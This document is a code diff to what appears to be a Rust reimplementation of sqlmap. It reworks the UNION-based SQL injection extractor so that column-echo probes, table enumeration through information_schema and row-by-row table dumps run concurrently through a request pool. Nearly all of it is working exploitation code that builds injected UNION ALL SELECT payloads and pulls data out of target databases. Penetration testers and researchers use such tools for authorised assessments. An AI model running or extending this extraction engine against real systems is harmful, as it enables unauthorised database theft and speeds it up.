@@ -10,9 +10,10 @@ use crate::engine::{assemble, build_request};
 use sqlmap_core::config::Config;
 use sqlmap_core::injection::Injection;
 use sqlmap_core::kb::{ColumnEntry, Enumeration, TableDump};
-use sqlmap_http::client::Client;
+use sqlmap_http::client::{Client, RequestSpec};
 use sqlmap_http::comparison::{filtered_page, ratio};
 use sqlmap_http::params::Param;
+use sqlmap_http::pool;
 
 /// Cap for inferred string length (sqlmap probes up to a similar bound).
 const MAX_LEN: u32 = 64;
@@ -341,11 +342,18 @@ impl<'a> UnionExtractor<'a> {
         })
     }
 
-    /// Send `UNION ALL SELECT <items>` through the injection boundary and
-    /// return the raw response body.
-    fn send_items(&mut self, items: &[String]) -> Option<String> {
+    /// Build one marked UNION request: fresh delimiting markers, the
+    /// SELECT-list row produced by `make_items`, assembled through the
+    /// injection boundary. Pure request construction - nothing is sent here,
+    /// so callers can batch independent requests for the worker pool.
+    fn build_marked(
+        &mut self,
+        marker_base: u64,
+        make_items: impl FnOnce(&Markers) -> String,
+    ) -> (Markers, RequestSpec) {
         self.seed += 1;
-        let payload = format!(" UNION ALL SELECT {}", items.join(","));
+        let m = markers(marker_base + self.seed);
+        let payload = format!(" UNION ALL SELECT {}", make_items(&m));
         let val = assemble(
             self.conf,
             &mut self.log,
@@ -354,25 +362,41 @@ impl<'a> UnionExtractor<'a> {
             &payload,
             30000 + self.seed,
         );
-        let resp = self
-            .client
-            .request(&build_request(self.conf, &self.param, &val))
-            .ok()?;
-        Some(resp.body)
+        (m, build_request(self.conf, &self.param, &val))
     }
 
-    fn null_row(&self) -> Vec<String> {
+    /// Fire built requests concurrently through the worker pool; response
+    /// bodies come back in request order (None on transport error).
+    fn fire(&self, specs: Vec<RequestSpec>) -> Vec<Option<String>> {
+        pool::run_requests(self.client, specs, self.conf.threads.max(1))
+            .into_iter()
+            .map(|r| r.ok().map(|resp| resp.body))
+            .collect()
+    }
+
+    fn null_row_items(&self) -> Vec<String> {
         vec!["NULL".to_string(); self.columns as usize]
     }
 
     /// Find which UNION column is reflected in the page (sqlmap `unionTest`'s
-    /// second half: probe each position with a delimited constant).
+    /// second half: probe each position with a delimited constant). The
+    /// per-position probes are independent, so they run through the pool.
     fn find_echo_position(&mut self) -> Option<usize> {
+        let mut marks = Vec::new();
+        let mut specs = Vec::new();
         for pos in 0..self.columns as usize {
-            let m = markers(40000 + self.seed);
-            let mut items = self.null_row();
-            items[pos] = format!("CONCAT({},0x70726f6265,{})", m.open_sql, m.close_sql);
-            let body = self.send_items(&items)?;
+            let mut items = self.null_row_items();
+            let (m, spec) = self.build_marked(40000, |m| {
+                items[pos] = format!("CONCAT({},0x70726f6265,{})", m.open_sql, m.close_sql);
+                items.join(",")
+            });
+            marks.push(m);
+            specs.push(spec);
+        }
+        let bodies = self.fire(specs);
+        for (pos, body) in bodies.iter().enumerate() {
+            let Some(body) = body else { continue };
+            let m = &marks[pos];
             if body.contains(&format!("{}probe{}", m.open_txt, m.close_txt)) {
                 return Some(pos);
             }
@@ -380,15 +404,39 @@ impl<'a> UnionExtractor<'a> {
         None
     }
 
+    /// Evaluate scalar subqueries, one per request, and extract each value
+    /// from its page echo. Independent subqueries run concurrently through
+    /// the pool; values come back in query order.
+    fn query_scalars(&mut self, echo_pos: usize, scalars: &[String]) -> Vec<Option<String>> {
+        let mut marks = Vec::with_capacity(scalars.len());
+        let mut specs = Vec::with_capacity(scalars.len());
+        for scalar in scalars {
+            let mut items = self.null_row_items();
+            let (m, spec) = self.build_marked(50000, |m| {
+                items[echo_pos] = format!("CONCAT({},({scalar}),{})", m.open_sql, m.close_sql);
+                items.join(",")
+            });
+            marks.push(m);
+            specs.push(spec);
+        }
+        self.fire(specs)
+            .iter()
+            .zip(&marks)
+            .map(|(body, m)| {
+                let body = body.as_ref()?;
+                let start = body.find(&m.open_txt)? + m.open_txt.len();
+                let end = body[start..].find(&m.close_txt)? + start;
+                Some(body[start..end].to_string())
+            })
+            .collect()
+    }
+
     /// Evaluate one scalar subquery and extract its value from the page echo.
     fn query_scalar(&mut self, echo_pos: usize, scalar: &str) -> Option<String> {
-        let m = markers(50000 + self.seed);
-        let mut items = self.null_row();
-        items[echo_pos] = format!("CONCAT({},({scalar}),{})", m.open_sql, m.close_sql);
-        let body = self.send_items(&items)?;
-        let start = body.find(&m.open_txt)? + m.open_txt.len();
-        let end = body[start..].find(&m.close_txt)? + start;
-        Some(body[start..end].to_string())
+        self.query_scalars(echo_pos, &[scalar.to_string()])
+            .into_iter()
+            .next()
+            .flatten()
     }
 
     /// Run the enumeration requested by the config flags, UNION channel.
@@ -426,14 +474,17 @@ impl<'a> UnionExtractor<'a> {
                 Some(d) => vec![d.clone()],
                 None => dbs.clone(),
             };
-            for db in targets {
-                if let Some(v) = self.query_scalar(
-                    echo,
-                    &format!(
+            let scalars: Vec<String> = targets
+                .iter()
+                .map(|db| {
+                    format!(
                         "SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema={}",
-                        hex(&db)
-                    ),
-                ) {
+                        hex(db)
+                    )
+                })
+                .collect();
+            for (db, v) in targets.iter().zip(self.query_scalars(echo, &scalars)) {
+                if let Some(v) = v {
                     let tables: Vec<String> =
                         v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
                     self.log.push(format!("  {db}: {}", tables.join(", ")));
@@ -469,18 +520,21 @@ impl<'a> UnionExtractor<'a> {
                             .query_scalar(echo, &format!("SELECT COUNT(*) FROM {db}.{table}"))
                             .and_then(|v| v.trim().parse::<u32>().ok())
                             .unwrap_or(0);
-                        let mut rows = Vec::new();
-                        for i in 0..n {
-                            if let Some(v) = self.query_scalar(
-                                echo,
-                                &format!(
+                        // Every row fetch is independent: batch them through the pool.
+                        let scalars: Vec<String> = (0..n)
+                            .map(|i| {
+                                format!(
                                     "SELECT CONCAT_WS(0x3a,{}) FROM {db}.{table} LIMIT {i},1",
                                     cols.join(",")
-                                ),
-                            ) {
-                                rows.push(v.split(':').map(String::from).collect::<Vec<_>>());
-                            }
-                        }
+                                )
+                            })
+                            .collect();
+                        let rows: Vec<Vec<String>> = self
+                            .query_scalars(echo, &scalars)
+                            .into_iter()
+                            .flatten()
+                            .map(|v| v.split(':').map(String::from).collect::<Vec<_>>())
+                            .collect();
                         self.log.push(format!("  dumped {} row(s) from {db}.{table}", rows.len()));
                         en.dumps.push(TableDump {
                             db,
